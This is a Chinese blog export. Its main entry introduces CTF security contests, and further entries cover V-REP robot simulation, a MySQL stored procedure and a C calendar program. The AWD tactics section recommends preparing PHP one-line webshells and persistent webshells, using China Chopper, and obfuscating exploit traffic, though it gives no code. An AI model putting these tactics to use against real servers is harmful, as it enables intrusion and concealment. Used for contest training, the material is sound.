id="攻防模式（Attack-Defense）"><a href="#攻防模式（Attack-Defense）" class="headerlink" title="攻防模式（Attack-Defense）"></a>攻防模式（Attack-Defense）</h2><p>在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。</p><h2 id="混合模式（Mix）"><a href="#混合模式（Mix）" class="headerlink" title="混合模式（Mix）"></a>混合模式（Mix）</h2><p>结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。</p><h1 id="题目类别"><a href="#题目类别" class="headerlink" title="题目类别"></a>题目类别</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译功底。主要考查参赛选手的逆向分析能力。<br>所需知识：汇编语言、加密与解密、常见反编译工具</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>Pwn 在黑客俚语中代表着攻破，获取权限，在 CTF 比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有整数溢出、栈溢出、堆溢出等。主要考查参赛选手对漏洞的利用能力。<br>所需知识：C，OD+IDA，数据结构，操作系统</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Web 是 CTF 的主要题型，题目涉及到许多常见的 Web 漏洞，如 XSS、文件包含、代码执行、上传漏洞、SQL 注入等。也有一些简单的关于网络基础知识的考察，如返回包、TCP/IP、数据包内容和构造。可以说题目环境比较接近真实环境。<br>所需知识：PHP、Python、TCP/IP、SQL</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，以及一些常见编码解码，主要考查参赛选手密码学相关知识点。通常也会和其他题目相结合。<br>所需知识：矩阵、数论、密码学</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>Misc 即安全杂项，题目涉及隐写术、流量分析、电子取证、人肉搜索、数据分析、大数据统计等，覆盖面比较广，主要考查参赛选手的各种基础综合知识。<br>所需知识：常见隐写术工具、Wireshark 等流量审查工具、编码知识</p><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><p>主要分为 Android 和 iOS 两个平台，以 Android 逆向为主，破解 APK 并提交正确答案。<br>所需知识：Java，Android 开发，常见工具</p><hr><h1 id="线下赛-AWD-模式"><a href="#线下赛-AWD-模式" class="headerlink" title="线下赛 AWD 模式"></a>线下赛 AWD 模式</h1><p>Attack With Defence，简而言之就是你既是一个 hacker，又是一个 manager。<br>比赛形式：一般就是一个 ssh 对应一个服务，可能是 web 也可能是 pwn，然后 flag 五分钟一轮，各队一般都有自己的初始分数，flag 被拿会被拿走 flag 的队伍均分，主办方会对每个队伍的服务进行 check，check 不过就扣分，扣除的分值由服务 check 正常的队伍均分。</p><h2 id="怎样拿到-flag"><a href="#怎样拿到-flag" class="headerlink" title="怎样拿到 flag"></a>怎样拿到 flag</h2><p>web 主要是向目标服务器发送 http 请求，返回 flag<br>bin 主要是通过 exploit 脚本读取 /home/username 下某个文件夹下的 flag 文件<br>Web 题目类型<br>出题人自己写的 CMS 或者魔改后的 CMS(注意最新漏洞、1day 漏洞等),常见(比如 Wordpress 博客啊、Discuz! 论坛啊)或者不常见 CMS 等,框架型漏洞(CI等)</p><h2 id="如何在-CTF-中当搅屎棍"><a href="#如何在-CTF-中当搅屎棍" class="headerlink" title="如何在 CTF 中当搅屎棍"></a>如何在 CTF 中当搅屎棍</h2><p>AWD 模式生存技巧能力：<br>漏洞反应能力,快速编写脚本,web代码审计<br>心态放好，因为 web 比较容易抓取流量，所以即使我们被打，我们也可以及时通过分析流量去查看别的队伍的 payload，从而进行反打。<br>脚本准备：一句话，文件包含，不死马、禁止文件上传等,警惕 web 弱口令，用最快的速度去补。</p><h2 id="Bin-题目类型"><a href="#Bin-题目类型" class="headerlink" title="Bin 题目类型"></a>Bin 题目类型</h2><p>大部分是 PWN，题目类型包括栈、堆、格式化字符串等等。<br>能力：<br>迅速找到二进制文件的漏洞，迅速打 patch 的能力,全场打 pwn 的 exp 脚本编写,熟悉服务器运维,尽快摸清楚比赛的 check 机制<br>如果二进制分析遇到障碍难以进行，那就去帮帮 web 选手运维,看看现场环境是否可以提权，这样可以方便我们搞操作（如魔改 libc 等等）<br>技巧<br>如果自己拿到 FB， 先用 NPC 服务器或者自己服务器测试，格外小心自己的 payload 不要被别的队伍抓取到, 写打全场的 exp 时，一定要加入混淆流量。提前准备好 PHP 一句话木马等等脚本。小心其他队伍恶意攻击使我们队伍机器的服务不能正常运行，因此一定要备份服务器的配置。尽可能在不搞崩服务和绕过 check 的情况下，上 WAF，注意分析别人打过来的流量，如果没有混淆，可以大大加快我们的漏洞分析速度。</p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>中国菜刀、 Nmap、Xshell、 合适的扫描器等。<br>心态不要崩。<br>不要忽视 Github 等平台，可能会有写好的 exp 可以用。<br>将 flag 的提交自动化。</p><h1 id="参考资料链接"><a href="#参考资料链接" class="headerlink" title="参考资料链接"></a>参考资料链接</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/#/introduction" target="_blank" rel="noopener">CTF资料链接1</a><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content" target="_blank" rel="noopener">CTF资料链接2</a></p>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>V-REP PRO机器人仿真系统有趣实例</title>
      <link href="/2018/06-12-V-REP%20PRO.html"/>
      <url>/2018/06-12-V-REP%20PRO.html</url>
      <content type="html"><![CDATA[<p><strong>本文同时有四份较大gif图，对设备性能有一定要求，手机端可能无法加载，建议使用PC电脑端访问</strong><br>V-REP是一款多功能的机器人仿真器,非常有趣。<a href="http://www.coppeliarobotics.com/index.html" target="_blank" rel="noopener">链接</a></p><blockquote><blockquote><p>1.具有4种物理引擎((ODE, Bullet, Vortex, Newton));<br>2.支持Windows，Linux，MacOS三种操作系统;<br>3.支持六种编程方法;<br>4.七种编程语言( (C/C++、Python、Java、Lua、Matlab、Octave、和 Urbi))。</p></blockquote></blockquote><h2 id="实例图"><a href="#实例图" class="headerlink" title="实例图"></a>实例图</h2><h3 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h3><p><img src="/article_img/ros1.gif" alt="&quot;实例1&quot;"></p><h3 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h3><p><img src="/article_img/ros2.gif" alt="&quot;实例2&quot;"></p><h3 id="实例3"><a href="#实例3" class="headerlink" title="实例3"></a>实例3</h3><p><img src="/article_img/ros3.gif" alt="&quot;实例3&quot;"></p><h3 id="实例4"><a href="#实例4" class="headerlink" title="实例4"></a>实例4</h3><p><img src="/article_img/ros4.gif" alt="&quot;实例4&quot;"></p>]]></content>
      
      <categories>
          
          <category> ROS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> V-REP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>mysql存储过程使用案例</title>
      <link href="/2018/06-03-mysql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%BD%BF%E7%94%A8%E6%A1%88%E4%BE%8B.html"/>
      <url>/2018/06-03-mysql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%BD%BF%E7%94%A8%E6%A1%88%E4%BE%8B.html</url>
      <content type="html"><![CDATA[<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>    检查该学生选课门数是否超过3门，若超过，不插入记录；<br>    检查该课程选课人数是否已满（在course表里添加一个属性列，记录课程人数限制）；<br>    选课人数已满：不插入记录；<br>    选课人数未满且未插入过：完成数据插入操作；<br>    选课人数未满，已插入过：不插入记录<br>    最后返回执行结果信息，例如：<br>    超过3门，返回-1；<br>    选课人数已满。返回0；<br>    选课人数未满且未插入过：返回1；<br>    选课人数未满已插入过：返回2</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="在course表里添加一个属性列，记录课程人数限制"><a href="#在course表里添加一个属性列，记录课程人数限制" class="headerlink" title="在course表里添加一个属性列，记录课程人数限制"></a>在course表里添加一个属性列，记录课程人数限制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alter table course</span><br><span class="line">add column n_limit int;</span><br><span class="line">update course</span><br><span class="line"><span class="built_in">set</span> n_limit=3;</span><br></pre></td></tr></table></figure><h3 id="创建存储存储过程take-course"><a href="#创建存储存储过程take-course" class="headerlink" title="创建存储存储过程take_course"></a>创建存储存储过程take_course</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mysql</span>中变量不用事前申明，在用的时候直接用“@变量名”使用就可以了</span><br><span class="line">DELIMITER // 的作用：改变sql的执行，默认是到分号;执行，改为到//执行，新版的mysql中创建存储过程容易出现提前执行的错误.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">DELIMITER //</span><br><span class="line">DROP procedure IF EXISTS take_course;</span><br><span class="line">create procedure take_course(<span class="keyword">in</span> s_no varchar(100),<span class="keyword">in</span> c_no varchar(100),out result int)</span><br><span class="line">begin</span><br><span class="line"><span class="built_in">set</span> @result=1, @n_count=0,@c_count=0;</span><br><span class="line">select count(*) into @n_count from sc</span><br><span class="line"><span class="built_in">where</span> s_no=sno;</span><br><span class="line">select count(*) into @c_count from sc</span><br><span class="line"><span class="built_in">where</span> c_no=cno;</span><br><span class="line"><span class="keyword">if</span> @n_count&gt;=3 <span class="keyword">then</span></span><br><span class="line">truetrue<span class="built_in">set</span> @result=-1;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> @c_count&lt;3 and not exists(select * from sc <span class="built_in">where</span> s_no=sno and c_no=cno)</span><br><span class="line">truetruetrue<span class="keyword">then</span> insert into sc(sno,cno)values(s_no,c_no);</span><br><span class="line">truetruetrue<span class="built_in">set</span> @result=1;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">truetruetrue<span class="keyword">if</span> @c_count&lt;3 and exists(select * from sc <span class="built_in">where</span> s_no=sno and c_no=cno)</span><br><span class="line">truetruetrue<span class="keyword">then</span> <span class="built_in">set</span> @result=2;</span><br><span class="line">truetruetrue<span class="keyword">else</span>  <span class="built_in">set</span> @result=0;</span><br><span class="line">truetruetrueend <span class="keyword">if</span>;</span><br><span class="line">truetruetrueend <span class="keyword">if</span>;</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line"><span class="built_in">set</span> result=@result;</span><br><span class="line">end//</span><br></pre></td></tr></table></figure><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如下列方式：</span><br><span class="line">call take_course(&apos;9521101&apos;,&apos;C04&apos;,@result);</span><br><span class="line">select @result;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>c语言简单日历小程序</title>
      <link href="/2018/05-28-c%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%97%A5%E5%8E%86%E5%B0%8F%E7%A8%8B%E5%BA%8F.html"/>
      <url>/2018/05-28-c%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%97%A5%E5%8E%86%E5%B0%8F%E7%A8%8B%E5%BA%8F.html</url>
      <content type="html"><![CDATA[<h2 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;conio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;  </span><br><span class="line">#include &lt;time.h&gt;  </span><br><span class="line">void menu();/*菜单*/</span><br><span class="line">void runnian();    /*判断是否是闰年*/</span><br><span class="line"></span><br><span class="line">void showCalendar(int y, int m);        /*显示日历*/</span><br><span class="line">int CalculatePerMonth(int y, int m);     /*计算每月都有多少天*/</span><br><span class="line"></span><br><span class="line">void input_birth();   /*统计出生的时间*/</span><br><span class="line"></span><br><span class="line">void now_day();/*统计日期是第多少天*/</span><br><span class="line"></span><br><span class="line">char *CalculateDay(int y, int m, int d);     /*用于计算输入的年月日对应的是周几*/</span><br><span class="line"></span><br><span class="line">int year, month, day;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">truemenu();</span><br><span class="line">trueprintf(&quot;\n&quot;);</span><br><span class="line">truereturn 0;</span><br><span class="line">&#125;</span><br><span class="line">void menu()</span><br><span class="line">&#123;</span><br><span class="line">trueint a;</span><br><span class="line">trueint type;</span><br><span class="line">trueint run = 1;</span><br><span class="line">truedo &#123;</span><br><span class="line">truetruesystem(&quot;cls&quot;);</span><br><span class="line">truetrueprintf(&quot;\n***************************************\n&quot;</span><br><span class="line">truetruetrue&quot;*    1.显示输入日期的月历             *\n&quot;</span><br><span class="line">truetruetrue&quot;*    2.判断某一年是否是闰年           *\n&quot;</span><br><span class="line">truetruetrue&quot;*    3.统计出生的时间                 *\n&quot;</span><br><span class="line">truetruetrue&quot;*    4.统计日期是第多少天             *\n&quot;</span><br><span class="line">truetruetrue&quot;*    0.退出。                         *\n&quot;</span><br><span class="line">truetruetrue&quot;***************************************\n&quot;);</span><br><span class="line">truetrueprintf(&quot;请按菜单进行选择(0-4)：&quot;);</span><br><span class="line">truetruescanf(&quot;%d&quot;, &amp;type);</span><br><span class="line">truetrueswitch (type) &#123;</span><br><span class="line">truetruecase 0:</span><br><span class="line">truetruetruewhile (1)</span><br><span class="line">truetruetrue&#123;</span><br><span class="line">truetruetruetruegetchar();</span><br><span class="line">truetruetruetrueprintf(&quot;你确定退出吗？(输入1退出)&quot;);</span><br><span class="line">truetruetruetruescanf(&quot;%d&quot;, &amp;a);</span><br><span class="line">truetruetruetrueif (a == 1)</span><br><span class="line">truetruetruetruetruereturn;</span><br><span class="line">truetruetruetrueelse</span><br><span class="line">truetruetruetrue&#123;</span><br><span class="line">truetruetruetruetrueprintf(&quot;退出取消，按任意键返回菜单...&quot;);</span><br><span class="line">truetruetruetruetruegetch();</span><br><span class="line">truetruetruetruetruesystem(&quot;cls&quot;);</span><br><span class="line">truetruetruetruetruebreak;</span><br><span class="line">truetruetruetrue&#125;</span><br><span class="line">truetruetrue&#125;</span><br><span class="line">truetruetruebreak;</span><br><span class="line"></span><br><span class="line">truetruecase 1:</span><br><span class="line">truetruetruesystem(&quot;cls&quot;);</span><br><span class="line">truetruetrueprintf(&quot;请输入年份及月份:\n&quot;);</span><br><span class="line">truetruetruescanf(&quot;%d%d&quot;, &amp;year, &amp;month);</span><br><span class="line">truetruetrueshowCalendar(year, month); break;</span><br><span class="line">truetruecase 2:runnian(); break;</span><br><span class="line">truetruecase 3:input_birth(); break;</span><br><span class="line">truetruecase 4:now_day(); break;</span><br><span class="line">truetruedefault: system(&quot;cls&quot;); break;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125; while (run);</span><br><span class="line">&#125;</span><br><span class="line">char *CalculateDay(int y, int m, int d)</span><br><span class="line">&#123;</span><br><span class="line">truestatic int r[13] = &#123; 0,0,3,3,6,1,4,6,2,5,0,3,5 &#125;;</span><br><span class="line">trueint c, w;</span><br><span class="line">truechar *week;</span><br><span class="line">truey %= 400;</span><br><span class="line">trueif ((y == 0 || y % 4 == 0 &amp;&amp; y % 100 != 0) &amp;&amp; m &lt; 3)</span><br><span class="line">truetruec = 5;</span><br><span class="line">trueelse</span><br><span class="line">truetruec = 6;</span><br><span class="line">truew = (y + y / 4 - y / 100 + r[m] + d + c) % 7;</span><br><span class="line">trueswitch (w)</span><br><span class="line">true&#123;</span><br><span class="line">truecase 0:</span><br><span class="line">truetrueweek = &quot;星期天&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 1:</span><br><span class="line">truetrueweek = &quot;星期一&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 2:</span><br><span class="line">truetrueweek = &quot;星期二&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 3:</span><br><span class="line">truetrueweek = &quot;星期三&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 4:</span><br><span class="line">truetrueweek = &quot;星期四&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 5:</span><br><span class="line">truetrueweek = &quot;星期五&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 6:</span><br><span class="line">truetrueweek = &quot;星期六&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">true&#125;</span><br><span class="line"></span><br><span class="line">truereturn week;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int CalculatePerMonth(int y, int m)  //计算每月有多天  </span><br><span class="line">&#123;</span><br><span class="line">trueif ((m == 1) || (m == 3) || (m == 5) || (m == 7) || (m == 8) || (m == 10) || (m == 12))</span><br><span class="line">truetruereturn 31;</span><br><span class="line">trueelse if (m != 2)</span><br><span class="line">truetruereturn 30;</span><br><span class="line">trueelse if ((y % 4 == 0) &amp;&amp; (y % 100 != 0) || (y % 400 == 0))</span><br><span class="line">truetruereturn 29;</span><br><span class="line">trueelse</span><br><span class="line">truetruereturn 28;</span><br><span class="line">&#125;</span><br><span class="line">void input_birth()</span><br><span class="line">&#123;</span><br><span class="line">truelong sum = 0;</span><br><span class="line">trueint year2, month2, day2;</span><br><span class="line">truestruct tm  t1 = &#123; 0 &#125;, t2 = &#123; 0 &#125;;</span><br><span class="line">truetime_t timep,a1,a2;   /*系统时间函数，获取当今年月日*/</span><br><span class="line">truestruct tm *p;</span><br><span class="line">truetime(&amp;timep);</span><br><span class="line">truep = gmtime(&amp;timep);</span><br><span class="line">truemonth2 = 1 + p-&gt;tm_mon;</span><br><span class="line">trueyear2 = 1900 + p-&gt;tm_year;</span><br><span class="line">trueday2 = p-&gt;tm_mday;</span><br><span class="line">trueprintf(&quot;请输入生日（年 月 日）:\n&quot;);</span><br><span class="line">truescanf(&quot;%d%d%d&quot;, &amp;year, &amp;month, &amp;day);</span><br><span class="line">truet1.tm_year = year - 1900;</span><br><span class="line">truet1.tm_mon = month - 1;</span><br><span class="line">truet1.tm_mday = day;</span><br><span class="line">truet2.tm_year = year2 - 1900;  /*当前时间*/</span><br><span class="line">truet2.tm_mon = month2 - 1;</span><br><span class="line">truet2.tm_mday = day2;</span><br><span class="line">truea1 = mktime(&amp;t1); /*转为秒的函数*/</span><br><span class="line">truea2 = mktime(&amp;t2);</span><br><span class="line">truesum = (a2 - a1) / (24 * 3600);</span><br><span class="line">trueprintf(&quot;已存活%ld天,%ld个小时&quot;, sum,sum*24 );</span><br><span class="line">truegetch();</span><br><span class="line">&#125;</span><br><span class="line">void now_day()</span><br><span class="line">&#123;</span><br><span class="line">trueint year2, month2, day2;</span><br><span class="line">truelong sum;</span><br><span class="line">truechar *week;</span><br><span class="line">truestruct tm t1 = &#123; 0 &#125;, t2 = &#123; 0 &#125;;</span><br><span class="line">truetime_t  a1, a2;</span><br><span class="line">trueprintf(&quot;请输入日期（年 月 日）:\n&quot;);</span><br><span class="line">truescanf(&quot;%d%d%d&quot;, &amp;year2, &amp;month2, &amp;day2);</span><br><span class="line">truet2.tm_year = year2 - 1900;</span><br><span class="line">truet2.tm_mon = month2 - 1;</span><br><span class="line">truet2.tm_mday = day2;</span><br><span class="line">truet1 = t2;</span><br><span class="line">truet1.tm_mon = 1 - 1;</span><br><span class="line">truet2.tm_mday = 1;</span><br><span class="line">truea1 = mktime(&amp;t1);</span><br><span class="line">truea2 = mktime(&amp;t2);</span><br><span class="line">trueweek = CalculateDay(year2, month2, day2);</span><br><span class="line">truesum = abs((a2 - a1) / (24 * 3600)) + 1;/*天数，+1*/</span><br><span class="line">trueprintf(&quot;已存活%ld天,%s&quot;,sum , week);</span><br><span class="line">truegetch();</span><br><span class="line">&#125;</span><br><span class="line">void showCalendar(int y, int m)  //显示日历</span><br><span class="line">&#123;</span><br><span class="line">truechar *week;          /*每月的1号是周几*/</span><br><span class="line">trueint perMonth;   /*每月共有多少天*/</span><br><span class="line">trueint w;</span><br><span class="line">trueprintf(&quot;当前月的月历如下:\n&quot;);</span><br><span class="line">trueperMonth = CalculatePerMonth(y, m);</span><br><span class="line">trueweek = CalculateDay(y, m, 1);</span><br><span class="line"></span><br><span class="line">trueif (week == &quot;星期天&quot;)</span><br><span class="line">truetruew = 0;</span><br><span class="line">trueelse if (week == &quot;星期一&quot;)</span><br><span class="line">truetruew = 1;</span><br><span class="line">trueelse if (week == &quot;星期二&quot;)</span><br><span class="line">truetruew = 2;</span><br><span class="line">trueelse if (week == &quot;星期三&quot;)</span><br><span class="line">truetruew = 3;</span><br><span class="line">trueelse if (week == &quot;星期四&quot;)</span><br><span class="line">truetruew = 4;</span><br><span class="line">trueelse if (week == &quot;星期五&quot;)</span><br><span class="line">truetruew = 5;</span><br><span class="line">trueelse if (week = &quot;星期六&quot;)</span><br><span class="line">truetruew = 6;</span><br><span class="line"></span><br><span class="line">trueprintf(&quot;\n**************************************&quot;);</span><br><span class="line">trueprintf(&quot;\n日    一    二    三    四    五    六&quot;);</span><br><span class="line">trueprintf(&quot;\n**************************************\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">trueint i = 0;</span><br><span class="line">trueint count = w;</span><br><span class="line"></span><br><span class="line">truewhile (w&gt;0)</span><br><span class="line">true&#123;</span><br><span class="line">truetrueprintf(&quot;      &quot;);</span><br><span class="line">truetruew--;</span><br><span class="line">true&#125;</span><br><span class="line"></span><br><span class="line">truefor (i = 1; i &lt;= perMonth; i++)</span><br><span class="line">true&#123;</span><br><span class="line">truetrueprintf(&quot;%-6d&quot;, i);</span><br><span class="line">truetruecount++;</span><br><span class="line">truetrueif (count == 7)</span><br><span class="line">truetrue&#123;</span><br><span class="line">truetruetrueprintf(&quot;\n&quot;);</span><br><span class="line">truetruetruecount = 0;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;</span><br><span class="line">trueprintf(&quot;\n**************************************\n&quot;);</span><br><span class="line">truegetch();</span><br><span class="line">&#125;</span><br><span class="line">void runnian()</span><br><span class="line">&#123;</span><br><span class="line">truesystem(&quot;cls&quot;);</span><br><span class="line">trueprintf(&quot;请输入年份：&quot;);</span><br><span class="line">truescanf(&quot;%d&quot;, &amp;year);</span><br><span class="line">trueif ((year % 4 == 0) &amp;&amp; (year % 100 != 0) || (year % 400 == 0))</span><br><span class="line">truetrueprintf(&quot;此年是闰年\n&quot;);</span><br><span class="line">trueelse</span><br><span class="line">truetrueprintf(&quot;此年不是闰年\n&quot;);</span><br><span class="line">truegetch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c language </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>markdown用户手册</title>
      <link href="/2018/05-25-markdown.html"/>
      <url>/2018/05-25-markdown.html</url>
